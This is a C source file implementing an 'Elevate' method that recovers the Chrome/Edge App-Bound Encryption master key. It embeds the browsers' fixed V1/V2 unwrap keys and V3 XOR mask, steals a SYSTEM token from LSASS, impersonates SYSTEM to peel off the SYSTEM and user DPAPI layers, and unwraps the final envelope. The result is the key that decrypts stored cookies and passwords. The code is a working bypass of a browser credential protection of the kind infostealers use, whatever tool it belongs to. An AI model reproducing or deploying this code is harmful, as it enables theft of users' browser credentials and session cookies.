#include "AbeDecrypt.h"

/*** method: Elevate (admin: SYSTEM + user DPAPI layers, then the private envelope) ***/

/* V1/V2 fixed keys, embedded (byte-identical) in the Chrome/Edge
   elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV1Key[ABE_KEY_SIZE] = {
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87
};
static const BYTE AbeV2Key[ABE_KEY_SIZE] = {
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
};

/* V3 XOR mask, applied to the CNG-decrypted blob; embedded (byte-identical) in the
   Chrome/Edge elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV3Mask[ABE_KEY_SIZE] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
};

/* V1/V2 envelope: version[1] + nonce[12] + ciphertext[32] + tag[16]; the v20 key
   is wrapped with a fixed embedded key, no elevation needed to unwrap */
static BOOL
AbeV1V2Unwrap(
    _In_ ULONG EnvelopeVersion,
    _In_reads_bytes_(ABE_V12_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NTSTATUS Status;
    ULONGLONG Step;

    Step = AbeStepStart();
    Status = EnvelopeVersion == 1 ?
        AbeAesGcmOpen(AbeV1Key, Envelope + 1, Envelope + 13, ABE_KEY_SIZE, Envelope + 45, Key) :
        AbeChaChaPoly1305Open(AbeV2Key, Envelope + 1, Envelope + 13, ABE_KEY_SIZE, Envelope + 45, Key);
    AbeLog(L"Elevate: unwrap V%lu envelope: %ls, status=0x%08lX (%I64ums)\r\n",
           EnvelopeVersion,
           NT_SUCCESS(Status) ? L"OK" : L"failed",
           (ULONG)Status,
           AbeStepMs(Step));
    if (!NT_SUCCESS(Status))
    {
        return FALSE;
    }
    return TRUE;
}

/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
   SYSTEM profile's Microsoft Software KSP store) */
static BOOL
AbeV3Unwrap(
    _In_ const ABE_BROWSER* Entry,
    _In_reads_bytes_(ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NCRYPT_PROV_HANDLE Provider = 0;
    NCRYPT_KEY_HANDLE CngKey = 0;
    BYTE Derived[ABE_KEY_SIZE];
    DWORD Length;
    SECURITY_STATUS St;
    NTSTATUS Status;
    ULONGLONG Step;
    ULONG i;

    Step = AbeStepStart();
    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
    AbeLogStepHr(L"Elevate", L"V3 open CNG provider", (HRESULT)St, Step);
    if (FAILED(St))
    {
        return FALSE;
    }
    Step = AbeStepStart();
    St = NCryptOpenKey(Provider, &CngKey, Entry->CngKey, 0, 0);
    AbeLog(L"Elevate: V3 open CNG key %ls: %ls, status=0x%08lX (%I64ums)\r\n",
           Entry->CngKey,
           FAILED(St) ? L"failed" : L"OK",
           (ULONG)St,
           AbeStepMs(Step));
    if (FAILED(St))
    {
        NCryptFreeObject(Provider);
        return FALSE;
    }

    /* raw 32->32 decrypt, as done by the browsers' elevation service and ChatGPT's importer */
    Step = AbeStepStart();
    St = NCryptDecrypt(CngKey,
                       (PBYTE)Envelope + 1,
                       ABE_KEY_SIZE,
                       NULL,
                       Derived,
                       sizeof(Derived),
                       &Length,
                       NCRYPT_SILENT_FLAG);
    AbeLogStepHr(L"Elevate", L"V3 CNG decrypt block", (HRESULT)St, Step);
    NCryptFreeObject(CngKey);
    NCryptFreeObject(Provider);
    if (FAILED(St))
    {
        return FALSE;
    }
    Step = AbeStepStart();
    if (Length != ABE_KEY_SIZE)
    {
        AbeLogStepHr(L"Elevate", L"V3 validate CNG block length", HRESULT_FROM_WIN32(ERROR_INVALID_DATA), Step);
        return FALSE;
    }
    AbeLogStepHr(L"Elevate", L"V3 validate CNG block length", S_OK, Step);

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Derived[i] ^= AbeV3Mask[i];
    }
    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
    Step = AbeStepStart();
    Status = AbeAesGcmOpen(Derived,
                           Envelope + 33,
                           Envelope + 45,
                           ABE_KEY_SIZE,
                           Envelope + 77,
                           Key);
    RtlSecureZeroMemory(Derived, sizeof(Derived));
    AbeLogStepNt(L"Elevate", L"V3 AES-GCM verify key", Status, Step);
    if (!NT_SUCCESS(Status))
    {
        return FALSE;
    }
    return TRUE;
}

/* innermost user-DPAPI payload: [u32 len][validation data][u32 len][payload];
   legacy Edge carries a raw key, Chrome/Edge a private envelope V1/V2/V3 */
static BOOL
AbeUnwrapInnerPayload(
    _In_ const ABE_BROWSER* Entry,
    _In_reads_bytes_(Size) const BYTE* Data,
    _In_ DWORD Size,
    _In_ HANDLE SystemToken,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
    _Out_ PULONG EnvelopeVersion)
{
    ULONG ValidationLength, PayloadLength;
    const BYTE* Payload;
    ULONGLONG Step;

    /* every subtraction below is guarded by the previous check, no overflow */
    Step = AbeStepStart();
    if (Size < 8)
    {
        goto _Malformed;
    }
    RtlCopyMemory(&ValidationLength, Data, sizeof(ValidationLength));
    if (ValidationLength > Size - 8)
    {
        goto _Malformed;
    }
    RtlCopyMemory(&PayloadLength, Data + 4 + ValidationLength, sizeof(PayloadLength));
    Payload = Data + 8 + ValidationLength;
    if (PayloadLength > Size - 8 - ValidationLength)
    {
        goto _Malformed;
    }
    AbeLogStepHr(L"Elevate", L"parse inner payload", S_OK, Step);

    Step = AbeStepStart();
    if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
    {
        NTSTATUS Status;

        AbeLogStepHr(L"Elevate", L"select V3 envelope", S_OK, Step);
        /* V3: the CNG unwrap must run as SYSTEM */
        Step = AbeStepStart();
        Status = PS_Impersonate(SystemToken);
        AbeLogStepNt(L"Elevate", L"impersonate SYSTEM for V3", Status, Step);
        if (!NT_SUCCESS(Status))
        {
            return FALSE;
        }
        {
            BOOL Ok = AbeV3Unwrap(Entry, Payload, Key);

            Step = AbeStepStart();
            Status = PS_Impersonate(NULL);
            AbeLogStepNt(L"Elevate", L"revert V3 SYSTEM impersonation", Status, Step);
            Ok = Ok && NT_SUCCESS(Status);
            if (Ok)
            {
                *EnvelopeVersion = 3;
            }
            return Ok;
        }
    }
    if (PayloadLength == ABE_V12_ENVELOPE_SIZE && Payload[0] >= 1 && Payload[0] <= 2)
    {
        AbeLogStepHr(L"Elevate", L"select V1/V2 envelope", S_OK, Step);
        /* V1/V2: fixed embedded key, any context */
        if (!AbeV1V2Unwrap(Payload[0], Payload, Key))
        {
            return FALSE;
        }
        *EnvelopeVersion = Payload[0];
        return TRUE;
    }
    if (PayloadLength == ABE_KEY_SIZE)
    {
        AbeLogStepHr(L"Elevate", L"select raw inner key", S_OK, Step);
        *EnvelopeVersion = 0;
        RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
        return TRUE;
    }
    AbeLog(L"Elevate: select inner payload format: failed, hr=0x%08lX, payload=%lu bytes (%I64ums)\r\n",
           (ULONG)HRESULT_FROM_WIN32(ERROR_NOT_SUPPORTED),
           PayloadLength,
           AbeStepMs(Step));
    return FALSE;

_Malformed:
    AbeLog(L"Elevate: parse inner payload: failed, hr=0x%08lX, size=%lu bytes (%I64ums)\r\n",
           (ULONG)HRESULT_FROM_WIN32(ERROR_INVALID_DATA),
           Size,
           AbeStepMs(Step));
    return FALSE;
}

_Success_(return != FALSE)
BOOL
AbeGetKeyElevate(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
    _Out_opt_ PULONG EnvelopeVersion)
{
    static BYTE Blob[4096];
    DATA_BLOB In, Out = { 0 };          /* Out is freed on failure paths */
    ULONG BlobLength = sizeof(Blob);    /* in/out capacity */
    ULONG LsaProcessId, Envelope;
    HANDLE SystemToken = NULL;
    NTSTATUS Status;
    HRESULT Hr;
    W32ERROR Error;
    ULONGLONG Step;
    BOOL Ok = FALSE;

    Step = AbeStepStart();
    Ok = AbeReadOsCryptBlob(Browser->UserDataDir,
                            L"app_bound_encrypted_key",
                            Blob,
                            sizeof(Blob),
                            &BlobLength,
                            &Hr);
    AbeLogStepHr(L"Elevate", L"read app_bound_encrypted_key", Hr, Step);
    if (!Ok)
    {
        return FALSE;
    }
    Step = AbeStepStart();
    Hr = BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0 ? S_OK : HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
    AbeLogStepHr(L"Elevate", L"validate APPB blob", Hr, Step);
    if (FAILED(Hr))
    {
        return FALSE;
    }
    Ok = FALSE;

    /* duplicate the SYSTEM impersonation token from lsass (admin needed) */
    Step = AbeStepStart();
    Status = Sys_GetLsaProcessId(&LsaProcessId);
    AbeLogStepNt(L"Elevate", L"find LSASS process", Status, Step);
    if (NT_SUCCESS(Status))
    {
        Step = AbeStepStart();
        Status = PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken);
        AbeLogStepNt(L"Elevate", L"duplicate SYSTEM token", Status, Step);
    }
    if (!NT_SUCCESS(Status))
    {
        return FALSE;
    }

    /* layer 1: SYSTEM DPAPI */
    In.pbData = Blob + 4;
    In.cbData = BlobLength - 4;
    Step = AbeStepStart();
    Status = PS_Impersonate(SystemToken);
    AbeLogStepNt(L"Elevate", L"impersonate SYSTEM", Status, Step);
    if (!NT_SUCCESS(Status))
    {
        goto _Exit;
    }
    Step = AbeStepStart();
    Ok = CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out);
    Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
    AbeLogStepWin32(L"Elevate", L"SYSTEM DPAPI decrypt", Error, Step);
    Step = AbeStepStart();
    Status = PS_Impersonate(NULL);
    AbeLogStepNt(L"Elevate", L"revert SYSTEM impersonation", Status, Step);
    if (!Ok || !NT_SUCCESS(Status))
    {
        Ok = FALSE;
        goto _Exit;
    }

    /* layer 2: user DPAPI, then unwrap the innermost structure */
    In.pbData = Out.pbData;
    In.cbData = Out.cbData;
    {
        DATA_BLOB Final = { 0 };        /* Final is freed on all paths below */

        Step = AbeStepStart();
        Ok = CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final);
        Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
        AbeLogStepWin32(L"Elevate", L"user DPAPI decrypt", Error, Step);
        if (!Ok)
        {
            Ok = FALSE;
        } else
        {
            Step = AbeStepStart();
            Ok = AbeUnwrapInnerPayload(&AbeBrowsers[Browser->Type],
                                       Final.pbData,
                                       Final.cbData,
                                       SystemToken,
                                       Key,
                                       &Envelope);
            AbeLogStepBool(L"Elevate", L"unwrap inner payload", Ok, Step);
            RtlSecureZeroMemory(Final.pbData, Final.cbData);
        }
        LocalFree(Final.pbData);
    }
    RtlSecureZeroMemory(Out.pbData, Out.cbData);
    LocalFree(Out.pbData);

_Exit:
    NtClose(SystemToken);
    if (Ok && EnvelopeVersion != NULL)
    {
        *EnvelopeVersion = Envelope;
    }
    return Ok;
}
